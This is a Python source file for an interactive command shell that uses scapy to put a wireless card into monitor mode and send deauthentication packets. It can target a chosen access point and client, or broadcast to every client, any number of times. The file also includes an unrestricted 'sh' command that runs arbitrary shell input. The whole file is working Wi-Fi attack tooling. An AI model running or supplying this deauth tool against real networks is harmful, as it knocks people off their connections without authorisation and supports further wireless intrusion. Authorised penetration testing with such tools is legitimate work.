import readline
import cmd
import os
import sys
import subprocess

from progress.bar import Bar
from scapy.sendrecv import sendp
from scapy.all import conf as scapy_conf

from wisec.interface import Interface
import wisec.deauth as deauth

class WifiShell(cmd.Cmd):
    prompt = '> '

    def __init__(self):
        super().__init__()
        self.histfile = os.path.expanduser('~/.sec_history')
        self.histfile_size = 1000

    def preloop(self):
        if readline and os.path.exists(self.histfile):
            readline.read_history_file(self.histfile)

    def postloop(self):
        if readline:
            readline.set_history_length(self.histfile_size)
            readline.write_history_file(self.histfile)

    def do_sh(self, arg):
        os.system(arg)

    def help_sh(self):
        print('sh [CMD]\nExecute shell command')

    def do_EOF(self, _):
        return True

    def do_monitor(self, arg):
        intr = Interface.find(arg.strip())
        if intr is None:
            intr = Interface.default

        print('Setting {} to monitor mode'.format(intr))
        if intr.monitor():
            print("\tSuccess")
        else:
            print("\tFailed")

    def complete_monitor(self, text, line, begidx, endidx):
        matches = []
        for name in Interface.all_names():
            if name.startswith(text):
                matches.append(name)
        return matches

    def help_monitor(self):
        print(f'''
monitor [interface]
Set `interface` to monitor mode.
    Default `interface` is {Interface.default.name}
'''.strip())

    def do_deauth(self, arg):
        arg = arg.strip().split()

        mac = None
        count = 1
        if len(arg) < 1:
            return
        elif len(arg) == 1:
            bssid = arg[0]
        elif len(arg) == 2:
            bssid, mac = arg[:2]
        else:
            bssid, mac, count = arg[:3]
            count = int(count)

        packet = deauth.packet(bssid, mac)
        print("Performing deauth against {} on {}".format(mac, bssid))

        try:
            if count == 1:
                sendp(packet)
            else:
                for i in Bar('').iter(range(count)):
                    sendp(packet)
        except KeyboardInterrupt:
            print('Interrupted')

    def help_deauth(self):
        print('''
deauth bssid [mac] [count]
Send `count` deauth packets against `mac` on `bssid`.
    `mac` defaults to 'all', which deauths on 'FF:FF:FF:FF:FF:FF'.
    `count` defaults to 1.
'''.strip())

    def do_default(self, arg):
        if not arg.strip():
            print(Interface.default)
            return

        intr = Interface.find(arg.strip())
        if intr is None:
            print('No such interface')
            return

        Interface.set_default(intr)

    def help_default(self):
        print('''
default [interface]
Set default `interface` to use.
When given no arguments, prints current default.
'''.strip())


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("Must be run as root.")
        sys.exit(1)

    scapy_conf.verb = 0

    try:
        WifiShell().cmdloop()
    except KeyboardInterrupt:
        pass
